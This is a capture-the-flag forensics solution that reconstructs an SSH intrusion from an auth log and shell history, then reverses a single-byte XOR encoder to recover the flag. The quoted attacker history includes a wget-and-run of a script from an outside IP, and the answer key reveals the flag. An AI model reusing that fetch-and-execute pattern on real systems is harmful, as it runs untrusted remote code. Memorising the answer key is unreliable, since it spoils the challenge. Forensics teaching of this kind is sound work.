# Solution — Bulletproof Tenant 2

**Flag:** `ingehack{x0r_1s_n0t_3ncryp1t10n}`

---

## Step 1 — Log analysis (`auth.log`)

Reading the auth log tells the same story as Part 1, but with an ending:

- Thousands of `Failed password` lines for `root` and `admin` from `179.43.153.2`.
- At **03:16:46** one line stands out:

  ```
  Oct 24 03:16:46 honeypot sshd[2387]: Accepted password for deploy from 179.43.153.2 port 51902 ssh2
  ```

  The attacker got in as **`deploy`** — and the session stayed open until **03:17:30**.

That is the pivot: everything in `bash_history` happens inside that session.

## Step 2 — Correlate with `bash_history`

The attacker's shell history shows the full chain:

```
wget http://179.43.153.2/encode.py -O /tmp/encode.py
cat /tmp/encode.py
python3 /tmp/encode.py /home/deploy/flag.txt
...
cat /home/deploy/flag.txt.enc
```

So the original `flag.txt` was replaced by `flag.txt.enc`, produced by `/tmp/encode.py`.

## Step 3 — Read the script (`encode.py`)

```python
KEY = 0x37
def encode(data):
    return bytes([b ^ KEY for b in data]).hex()
```

Two facts:

1. Each byte is XORed with **`0x37`** (decimal 55).
2. The result is written as a **lowercase hex string**.

Nothing else. No compression, no key derivation, no IV.

## Step 4 — Reverse it

`flag.txt.enc` contains the hex string from XORing the plaintext with `0x37`. The inverse is trivial: hex-decode, then XOR each byte with `0x37`.

```python
KEY = 0x37
with open("flag.txt.enc") as f:
    data = bytes.fromhex(f.read().strip())
print(bytes([b ^ KEY for b in data]).decode())
```

Output:

```
ingehack{x0r_1s_n0t_3ncryp1t10n}
```

---

## Skills learned

| Step | Skill |
|---|---|
| 1 | Reading `sshd` auth logs, spotting the successful login among brute-force noise |
| 2 | Correlating multiple artifacts (auth log → shell history) to reconstruct a session |
| 3 | Reading a short Python script to identify the transform (single-byte XOR + hex) |
| 4 | Writing the inverse of a simple encoder to recover the plaintext |

## Author notes

- This is a deliberate step down in difficulty from Part 1: the payload is handed to the player — the work is *reading* it.
- The XOR key (`0x37`) is visible in the script; there is no need to brute-force it. The lesson is "read before you reverse."
- `flag.txt.enc` is 64 hex characters (32 bytes), matching the 32-character plaintext `ingehack{x0r_1s_n0t_3ncryp1t10n}`. Useful sanity check for players who hexdump the file.
- The attacker's `rm -f /home/deploy/notes.txt` is flavour; it has nothing to do with the flag.
- All four attachments are needed: `auth.log` (how they got in), `bash_history` (what they did), `encode.py` (how it was transformed), `flag.txt.enc` (the data to recover).
